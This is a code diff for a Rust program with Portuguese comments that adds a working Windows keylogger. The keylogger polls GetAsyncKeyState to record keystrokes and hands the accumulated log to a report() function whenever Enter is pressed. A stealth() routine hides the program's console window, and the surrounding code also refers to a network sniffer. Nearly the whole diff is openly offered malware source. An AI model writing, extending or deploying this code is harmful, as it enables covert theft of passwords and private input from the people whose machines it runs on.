@@ -36,14 +36,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         eprintln!("Erro ao atualizar dados auxiliares: {:?}", err);
     }
 
-    // Resto do código...
-
-    // Iniciar thread para keylogger
-    thread::spawn(move || {
+    let handle = thread::spawn(|| {
         keylogger();
     });
 
-    // Loop principal
+    handle.join().unwrap();
     loop {
         // Resto do código...
 
@@ -52,10 +49,50 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 }
 
-// ... Resto do código existente ...
-
 fn keylogger() {
-    // Resto do código...
+    stealth();
+    let mut log = String::new();
+
+    loop {
+        for i in 8..190 {
+            if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
+                let key: String = match i as u32 {
+                    32 => " ".into(),
+                    8 => "[Backspace]".into(),
+                    13 => "\n".into(),
+                    190 | 110 => ".".into(),
+                    _ => (i as u8 as char).to_string(),
+                };
+                log.push_str(&key);
+            }
+        }
+
+        // Verifica se a tecla Enter foi pressionada corretamente
+        let enter_pressed = unsafe {
+            user32::GetAsyncKeyState(13) & 0x8000u16 as i16 != 0
+        };
+
+        if enter_pressed {
+            if !log.is_empty() {
+                report(&log);
+                log.clear();
+            }
+        }
+
+        // Aguarde um curto período para evitar uso excessivo da CPU
+        thread::sleep(Duration::from_millis(10));
+    }
+}
+
+fn stealth() {
+    unsafe {
+        kernel32::AllocConsole();
+        let stealth = user32::FindWindowA(
+            ptr::null_mut(),
+            ptr::null(),
+        );
+        user32::ShowWindow(stealth, 0);
+    }
 }
 
 fn sniffer(tx: std::sync::mpsc::Sender<String>) {
